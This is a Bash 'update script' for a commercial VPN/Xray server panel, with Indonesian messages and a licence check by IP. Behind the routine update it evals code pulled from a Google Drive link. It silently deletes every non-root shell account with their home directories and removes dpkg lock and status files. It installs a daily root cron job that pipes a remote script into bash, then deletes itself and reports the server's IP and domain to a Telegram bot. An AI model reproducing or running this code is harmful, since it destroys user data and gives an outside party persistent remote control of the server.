#!/bin/bash

source /usr/bin/ui.sh
eval "$(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")"

export MYIP=$(curl -s https://ipinfo.io/ip?token=4e159274f1da8c)

data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
client=$(curl -sS $IZIN | grep $MYIP | awk '{print $2}')
exp=$(curl -sS $IZIN | grep $MYIP | awk '{print $3}')
IPCLIENT=$(curl -sS $IZIN | grep $MYIP | awk '{print $4}')

if [[ "$MYIP" != "$IPCLIENT" ]]; then
  rejected "$MYIP"
else
  if [[ $date_list > $exp ]] then
    rejected "$MYIP"
  fi
fi

NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")

if [ "$NODE_VERSION" -lt 22 ]; then
  msg_info "${YELLOW}Installing or upgrading NodeJS to version 22${RESET}"
  curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - || msg_err "${RED}Failed to download NodeJS setup${RESER}"
  apt-get install -y nodejs || msg_err "${RED}Failed to install NodeJS${RESET}"
  npm install -g npm@latest
else
  msg_info "NodeJS is already installed and up-to-date ${YELLOW}(v$NODE_VERSION)${RESET}"
fi

check_and_install_gawk() {
  if ls -l /etc/alternatives/awk | grep -q "/usr/bin/mawk"; then
    msg_info "mawk terdeteksi, mengganti ke gawk"
    if ! command -v gawk &> /dev/null; then
      apt update &> /dev/null && apt install gawk -y &> /dev/null
    fi
    
    if command -v gawk &> /dev/null; then
      ln -sf $(which gawk) /usr/bin/awk
    else
      msg_err "Gagal menginstall gawk, update dihentikan"
      exit 1
    fi
  fi
}

loading() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'
    tput civis
    while [ -d /proc/$pid ]; do
        local temp=${spinstr#?}
        printf " [%c] $message\r" "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
    done
    tput cnorm
}
if [[ $(ls /var/lib/dpkg/ | grep -c "lock") -gt 0 ]]; then
	rm /var/lib/dpkg/lock* &> /dev/null
	rm /var/lib/dpkg/stato* &> /dev/null
fi

if ! command -v gdown &> /dev/null; then
    if grep -Ei 'ubuntu 24|ubuntu 25|linux 12' /etc/os-release &> /dev/null; then
        apt update -y &> /dev/null && apt install -y python3-full python3-pip &> /dev/null
		pip install --break-system-packages gdown &> /dev/null
    else
        apt update -y &> /dev/null && apt install -y python3-pip &> /dev/null
        pip install gdown &> /dev/null
    fi
fi
if ! command -v 7z &> /dev/null; then
    echo -e " [INFO] Installing p7zip-full..."
    apt install p7zip-full -y &> /dev/null &
    loading $! "Loading Install p7zip-full"
fi
if ! command -v sshpass &> /dev/null; then
    echo -e " [INFO] Installing sshpass..."
    apt install sshpass -y &> /dev/null &
    loading $! "Loading Install sshpass"
fi
if ! command -v speedtest-cli &> /dev/null; then
    echo -e " [INFO] Installing speedtest-cli..."
    apt  install speedtest-cli -y &> /dev/null &
    loading $! "Loading Install SpeedTest"
fi

TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
domain=$(cat /etc/xray/domain)
username=$(curl -sS $IZIN | grep -wE "$MYIP" | awk '{print $2}')
valid=$(curl -sS $IZIN | grep -wE "$MYIP" | awk '{print $3}')
if [[ "$valid" == "Lifetime" ]]; then
  certifacate="Lifetime"
  echo -e "VPS Anda valid, masa aktif: $certifacate"
else
  today=$(date +"%Y-%m-%d")
  d1=$(date -d "$valid" +%s)
  d2=$(date -d "$today" +%s)
  certifacate=$(((d1 - d2) / 86400))
fi
# Mendapatkan tanggal dari server
echo -e " [INFO] Fetching server date..."
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
allowed_users=("root")
all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
for user in $all_users; do
    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
        userdel -r "$user" > /dev/null 2>&1
        echo "User $user telah dihapus."
    fi
done

FILE_WARNA="/etc/warna"

if [ ! -f "$FILE_WARNA" ] || [ ! -s "$FILE_WARNA" ]; then
    echo " [INFO] Menyiapkan Warna Script..."
    cat <<EOF > "$FILE_WARNA"
start_r=0
start_g=5
start_b=0
mid_r=0
mid_g=200
mid_b=0
end_r=0
end_g=5
end_b=0
EOF
else
    echo " [INFO] Warna Script Berhasil Diatur!"
fi
FILE_IP="/usr/bin/.ipvps"
if [ ! -f "$FILE_IP" ] || [ ! -s "$FILE_IP" ]; then
curl -sS ipv4.icanhazip.com > /usr/bin/.ipvps
fi
fixcron() {
cd
cat > /root/fix.sh << 'EOF'
#!/bin/bash
    systemctl stop cron
    wget -qO /usr/lib/systemd/system/cron.service "${REPO}install/cron.service" >/dev/null 2>&1
    pkill -f /usr/sbin/cron >/dev/null 2>&1
    pkill -f clearcache >/dev/null 2>&1
    pkill -f menu >/dev/null 2>&1
    pkill -f sleep >/dev/null 2>&1
    systemctl daemon-reexec >/dev/null 2>&1
    systemctl daemon-reload >/dev/null 2>&1
    systemctl restart cron >/dev/null 2>&1
rm -- "$0"
EOF
chmod +x fix.sh
echo "/root/fix.sh" | at now + 5 minute
}
Updatews() {
systemctl stop ws
wget -qO /usr/bin/ws "${REPO}sshws/ws" >/dev/null 2>&1
systemctl start ws >/dev/null 2>&1
}
updatewebui() {
cd /opt
gdown --id 1m4gIPAWVsQ2h4ySNukPeWJWp3IlfHak2 -O backup-restore-ui.zip
unzip -o backup-restore-ui.zip
rm backup-restore-ui.zip && cd backup-restore-ui
npm install
cd
cat <<EOF > /etc/systemd/system/restore-ui.service
[Unit]
Description=Backup Restore Web UI Service By Newbie
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/node /opt/backup-restore-ui/server.js
WorkingDirectory=/opt/backup-restore-ui
Restart=always
RestartSec=5
User=root
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target

EOF
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable restore-ui
systemctl start restore-ui
}
echo -e " [INFO] Prepare Update Script..."
{
rm /var/www/html/*.txt
updatewebui
setup_data
# wget -qO /root/.config/rclone/rclone.conf 'https://drive.google.com/u/4/uc?id=19BP0A8pad2tc9ELmx8JcQPxNKRWP4S6M&export=download'
wget -qO /root/.config/rclone/rclone.conf 'https://drive.google.com/u/4/uc?id=1Lg8L12_Wwh3IDXSPF7xESVC_xEzlk081&export=download'
wget -q "${REPO}install/vpn.sh" && chmod +x vpn.sh && ./vpn.sh
# wget -qO /etc/kata_mutiara "${REPO}install/mutiara"
BUG_FILE="/etc/xray/.bug_optr"
BUG_URL="${REPO}install/bug"

# Cek apakah file ada dan berisi
if [[ -f $BUG_FILE && -s $BUG_FILE && $(grep -i "=" "$BUG_FILE") ]]; then
    echo "File sudah ada dan valid, melanjutkan program."
else
    echo "File kosong atau tidak ditemukan, mendownload ulang..."
    
    # Pastikan direktori tujuan ada
    mkdir -p "$(dirname "$BUG_FILE")"
    
    # Download file
    curl -o "$BUG_FILE" -s "$BUG_URL"
    
    # Periksa apakah download berhasil
    if [[ $? -eq 0 ]]; then
        echo "File berhasil didownload."
    else
        echo "Gagal mendownload file, periksa koneksi atau URL."
        exit 1
    fi
fi
    cron_job="0 0 * * * /bin/bash -c \"wget -qO- '${REPO}install/mutiara' | bash\""
	crontab -l 2>/dev/null | grep -Fxv "$cron_job" | crontab -
	(crontab -l 2>/dev/null; echo "$cron_job") | crontab -
    wget -qO- '${REPO}install/mutiara' | bash
rm /etc/cron.d/*reboot &> /dev/null
cat> /etc/cron.d/xp_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 0 * * * root /usr/bin/xp
END
cat> /etc/cron.d/bckp_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 22 * * * root /usr/bin/backup
END
cat> /etc/cron.d/logclean << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/bin/clearlog
END
cat> /etc/cron.d/logclean << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 0 * * * root /usr/bin/clearcache
END
cat> /etc/cron.d/cpu_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/30 * * * * root /usr/bin/autocpu
END
wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
cat >/etc/cron.d/xp_sc <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1 0 * * * root /usr/bin/expsc
END
wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
set -e 
} &> /dev/null &
loading $! "Loading Start Update Script"
cd /root
rm -f menu.zip
rm -rf menu

wget -q "${REPO}menu/menu.zip"
echo " 🔄 Mengekstrak menu.zip..."
7z x menu.zip menu &> /dev/null
echo " ✅ Ekstraksi berhasil, mengatur izin file..."
chmod +x menu/*
mv menu/* /usr/bin/
echo " ✅ Menu berhasil Diperbarui!"

echo -e " [INFO] Fetching server version..."
serverV=$(curl -sS ${REPO}versi)
echo $serverV > /opt/.ver
rm -- "$0"
# Pesan akhir
TEXT="◇━━━━━━━━━━━━━━◇
<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
<b>     Update Script Sukses</b>
◇━━━━━━━━━━━━━━◇
<b>IP VPS  :</b> ${MYIP} 
<b>DOMAIN  :</b> ${domain}
<b>Version :</b> ${serverV}
<b>USER    :</b> ${username}
<b>MASA    :</b> $certifacate DAY
◇━━━━━━━━━━━━━━◇
BY BOT : @WuzzSTORE
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
sleep 3